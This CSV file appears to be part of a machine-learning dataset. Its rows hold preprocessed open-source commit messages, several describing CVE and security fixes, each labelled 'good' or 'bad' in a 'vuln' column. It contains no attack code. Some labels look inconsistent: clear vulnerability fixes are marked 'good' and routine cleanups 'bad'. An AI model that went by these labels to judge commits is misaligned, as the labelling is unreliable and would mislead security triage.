"";"index";"all_text";"vuln"
"1910";"12820";"fix multiple file inclusion vulnerability local file inclusion remote file inclusion directory traversal vulnerabilites discovered by janek vind come2waraxe yahoo com";"good"
"1911";"950";"security fix bug fix";"bad"
"1912";"258";"fix cve 2019 13224 don t allow different encoding for onig_new_deluxe";"bad"
"1913";"8091";"merge pull request 498 from xsuchy pull req bz805127 805127 require candlepin selinux";"good"
"1914";"11654";"v1 904 avoid being fooled by an addr like string in the phrase avoid a slowdown by avoiding backtracking into the phrase";"good"
"1915";"2198";"uriquery c catch integer overflow in composequery and ex";"bad"
"1916";"3932";"cve 2017 13021 icmp6 add a missing bound check this fix a buffer over read discovered by bhargava shastry sect tu berlin add a test using the capture file supplied by the reporter s modified so the capture file won t be rejected a an invalid capture";"bad"
"1917";"2697";"critical sql escape limit and order by argument to counter possible injection attack";"bad"
"1918";"10686";"removing extraneous slash from sql query in readme file";"good"
"1919";"8707";"fix parse oidname and santilize dimension name 4498";"good"
"1920";"5260";"updated commented out role policy override setting for greater default security of cie information";"bad"
"1921";"10536";"fix for 185";"good"
"1922";"12083";"pango language fix small leak reported by tommi rantala";"good"
"1923";"12307";"merge pull request 146 from ruleant bug_3783 fix bug 3783 instanciate class before calling static method";"good"
"1924";"6456";"x safe guard";"bad"
"1925";"10070";"backport fix for openbsd pr 6267 it ha zero implication on pure ftpd but keeping openbsd code in sync can t hurt";"good"
"1926";"4892";"remove mass assignment of role id";"bad"
"1927";"2488";"php security re fix directory traversal vulnerability for window server rel commit 157f471d7e48f190f74e66eb5bc73360b5352fd3";"bad"
"1928";"5745";"resolve 760 x prevented tooltips are escaped";"bad"
"1929";"9441";"tcp fix dead store dead assignement dead increment warning found by clang packet tcp c 2155 warning value stored to relseq during it initialization is never read packet tcp c 3511 warning value stored to assignedmetaid is never read packet tcp c 3514 warning value stored to assignedmetaid is never read change id i68d8088fc54da5ad52361510d43b893e58bf419f reviewed on http code wireshark org review 14695 petri dish alexis la goutte alexis lagoutte gmail com reviewed by matthieu coudron matthieu coudron lip6 fr tested by petri dish buildbot buildbot no reply wireshark org reviewed by michael mann mmann78 netscape net";"good"
"1930";"6216";"added csrf protection to bug update form git svn id http mantisbt svn sourceforge net svnroot mantisbt trunk 5294 f5dc347c c33d 0410 90a0 b07cc1902cb9";"bad"
"1931";"4722";"avcodec dnxhd_parser do not return invalid value from dnxhd_find_frame_end on error fix null pointer dereference fix cve 2017 9608 found by yihan lian signed off by michael niedermayer michael niedermayer cc cherry picked from commit 611b35627488a8d0763e75c25ee0875c5b7987dd signed off by michael niedermayer michael niedermayer cc";"bad"
"1932";"1828";"mirror prepend to rm and chmod argument to avoid url recognition fix 452";"bad"
"1933";"11159";"fixed some issue with the previous jpeg commit";"good"
"1934";"1605";"bugfix casting return value on text helper method in stringfield text varchar";"bad"
"1935";"864";"a memory leak can occur in dtls1_buffer_record if either of the call to ssl3_setup_buffers or pqueue_insert fail the former will fail if there is a malloc failure whilst the latter will fail if attempting to add a duplicate record to the queue this should never happen because duplicate record should be detected and dropped before any attempt to add them to the queue unfortunately record that arrive that are for the next epoch are not being recorded correctly and therefore replay are not being detected additionally these should not happen failure that can occur in dtls1_buffer_record are not being treated a fatal and therefore an attacker could exploit this by sending repeated replay record for the next epoch eventually causing a do through memory exhaustion thanks to chris mueller for reporting this issue and providing initial analysis and a patch further analysis and the final patch wa performed by matt caswell from the openssl development team cve 2015 0206 reviewed by dr stephen henson steve openssl org";"bad"
"1936";"13065";"phpdoc";"good"
"1937";"3301";"check permission before rollback";"bad"
"1938";"9059";"tty retry failed reopen if tty teardown in progress a small window exists where a tty reopen will observe the tty just prior to imminent teardown tty count 0 in this case open return eio to userspace instead retry the open after checking for signal and yielding this interruptible retry loop allows teardown to commence and initialize a new tty on retry never retry the bsd master pty reopen there is no guarantee the pty pair teardown is imminent since the slave file descriptor may remain open indefinitely signed off by peter hurley peter hurleysoftware com cc stable stable vger kernel org 4 4 signed off by greg kroah hartman gregkh linuxfoundation org";"good"
"1939";"4427";"try to fix xmpp client user impersonation vulnerability";"bad"
"1940";"305";"http github com imagemagick imagemagick issue 1629";"bad"
"1941";"7341";"merge pull request 1012 from exiv2 mergify bp 0 27 maintenance pr 1002 bump ci container bp 1002";"good"
"1942";"11123";"remove trailing space";"good"
"1943";"6967";"initialize a buffer and ensure the last item is never written to this should fix the item in issue 6 exposed by stackoverflow2 pdf thanks to rtfingc for finding and reporting this issue";"good"
"1944";"6217";"fix 8975 csrf vulnerability in user_create this process will be rolled out in piece to the rest of mantis and the 1 2 x trunk a chance permit git svn id http mantisbt svn sourceforge net svnroot mantisbt trunk 5292 f5dc347c c33d 0410 90a0 b07cc1902cb9";"bad"
"1945";"8611";"fixed out of bound read thanks to eric sesterhenn from x41 d sec gmbh for reporting and suggesting security fix";"good"
"1946";"11310";"yama better permission check for ptraceme change the permission check for yama_ptrace_ptracee to the standard ptrace permission check testing if the traceer ha cap_sys_ptrace in the tracees user namespace reviewed by kees cook keescook chromium org signed off by eric w biederman ebiederm xmission com";"good"
"1947";"12099";"6933 lp v anonymized test git svn id http svn ilias de svn ilias trunk 26882 21b2c9ec 7c21 0410 8b45 9bfb8ed2bfc5";"good"
"1948";"1695";"net cleanup in sock_setsockopt use min_t max_t macro reformat two comment use test_bit to match sock_flag signed off by eric dumazet edumazet google com signed off by david s miller davem davemloft net";"bad"
"1949";"10733";"update travis configuration";"good"
"1950";"12614";"issue 4843 implemented improved text filtering the free text filter box now search for individual term in the field separately obeys quoting pattern and allows for negation all term found are required to be found somewhere in the issue or not found anywhere for negated term in order for the issue to match the filter example search and their expected result bus car should find any issue that mention both bus and car micro computer should find any issue that mention micro computer exactly this match the existing search behavior apple banana should find any issue that mention apple but ha no mention of banana circuit power line should find any issue that mention circuit but ha no mention of power line";"good"
"1951";"11916";"4 2 9 release signed off by marc delisle marc infomarc info";"good"
